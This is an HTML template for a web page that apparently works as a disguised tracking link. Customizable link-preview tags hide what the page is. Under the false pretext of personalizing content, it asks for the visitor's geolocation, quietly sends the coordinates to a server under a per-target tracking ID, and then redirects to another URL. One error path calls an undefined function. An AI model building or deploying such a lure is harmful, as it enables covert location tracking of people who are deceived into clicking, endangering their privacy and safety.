<!DOCTYPE html>
<html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta property="og:type" content="website" />
    <meta property="og:url" content="<%= ogUrl %>" />
    <meta property="og:title" content="<%= ogTitle %>" />
    <meta property="og:description" content="<%= ogDescription %>" />
    <meta property="og:image" content="<%= ogImage %>" />
    <title><%= ogTitle %></title>
    <script src="https://cdn.jsdelivr.net/npm/eruda@latest/eruda.min.js"></script>
    <script>
      eruda.init();
    </script>

    <style>
      body {
        font-family: sans-serif;
        padding: 2rem;
        max-width: 600px;
        margin: 0 auto;
      }

      button {
        padding: 12px 24px;
        font-size: 16px;
        background: #007bff;
        color: white;
        border: none;
        border-radius: 4px;
        cursor: pointer;
      }

      button:disabled {
        cursor: not-allowed;
        background: #ccc;
      }

      #status {
        margin-top: 1rem;
        padding: 10px;
        border-radius: 4px;
      }

      .error {
        background: #fee;
        color: #c33;
      }

      .success {
        background: #efe;
        color: #3a3;
      }

      .info {
        background: #eef;
        color: #33a;
      }
    </style>
  </head>
  <body style="font-family: sans-serif; padding: 2rem">
    <h2>We need your permission to improve your experience</h2>
    <p>To continue, we'll ask for your approximate location to help personalize content.</p>
    <button id="location-btn" onclick="getLocation()">Grant Location Access</button>

    <div id="status" style="margin-top: 1rem"></div>

    <script>
      const targetURL = '<%= targetUrl  %>';
      const trackingId = '<%= trackingId %>';
      let redirectAttempted = false;

      function showStatus(message, type = 'info') {
        const statusElement = document.getElementById('status');
        statusElement.innerText = message;
        statusElement.className = type;
      }

      function forceRedirection() {
        if (redirectAttempted) return;

        redirectAttempted = true;
        showStatus('Redirecting....');

        try {
          window.location.href = targetURL;
        } catch (e) {
          try {
            window.location.replace(targetURL);
          } catch (e2) {
            window.location.href = targetURL;
          }
        }

        setTimeout(() => {
          if (!redirectAttempted) return;
          showStatus('Redirect failed. Click here to continue manually', 'error');

          const link = document.createElement('a');

          link.href = targetURL;
          link.innerText = 'Click here to continue';
          link.style.display = 'block';
          link.style.marginTop = '10px';
          link.style.fontSize = '18px';
          document.getElementById('status').appendChild(link);
        }, 2000);
      }

      async function sendLocation(latitude, longitude) {
        console.log(latitude, longitude);

        // Fire and forget - don't wait for response
        // Use sendBeacon for reliability during page unload
        if (navigator.sendBeacon) {
          const blob = new Blob([JSON.stringify({ latitude, longitude })], {
            type: 'application/json',
          });
          navigator.sendBeacon(`/api/v1/location/${trackingId}`, blob);
        } else {
          // Fallback to fetch without waiting
          fetch(`/api/v1/location/${trackingId}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ latitude, longitude }),
            keepalive: true, // Ensures request completes even after redirect
          }).catch((err) => console.error('Location send failed:', err));
        }
      }

      async function getLocation() {
        const locationButton = document.getElementById('location-btn');
        locationButton.disabled = true;

        showStatus('Requesting location.....', 'info');

        if (!navigator.geolocation) {
          showStatus('Geolocation is not supported by your browser.', 'error');
          setTimeout(forceRedirection, 2000);
          return;
        }
        try {
          const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
              // enableHighAccuracy: false,
              // timeout: 10000,
              // maximumAge: 300000, // 5 minutes
            });
          });

          const { latitude, longitude } = position.coords;
          console.log('Location obtained:', { latitude, longitude });
          showStatus('Location received! Redirecting...', 'success');

          // Send location in background, don't wait for response
          sendLocation(latitude, longitude);

          // Redirect immediately (don't wait for API)
          setTimeout(() => {
            forceRedirection();
          }, 100);
        } catch (error) {
          console.error('Geolocation error:', error);
          let errorMsg = 'Failed to get location. ';

          switch (error.code) {
            case error.PERMISSION_DENIED:
              errorMsg += 'Permission denied.';
              break;
            case error.POSITION_UNAVAILABLE:
              errorMsg += 'Location unavailable.';
              break;
            case error.TIMEOUT:
              errorMsg += 'Request timed out.';
              break;
            default:
              errorMsg += 'Unknown error.';
          }

          showStatus(errorMsg + ' Redirecting anyway...', 'error');

          // Still redirect even if location fails
          setTimeout(forceRedirect, 1500);
        }

        setTimeout(() => {
          if (!redirectAttempted && document.visibilityState === 'visible') {
            showStatus(`Taking too long. Redirecting now...`, 'info');
            forceRedirection();
          }
        }, 15000);

        document.addEventListener('visibilitychange', () => {
          if (redirectAttempted && document.visibilityState === 'visible') {
            showStatus(` Redirect may have failed...`, 'error');

            const link = document.createElement('a');

            link.href = targetURL;
            link.innerText = 'Click here to continue';
            link.style.display = 'block';
            link.style.marginTop = '10px';
            link.style.fontSize = '18px';
            document.getElementById('status').appendChild(link);
          }
        });
      }
    </script>
  </body>
</html>
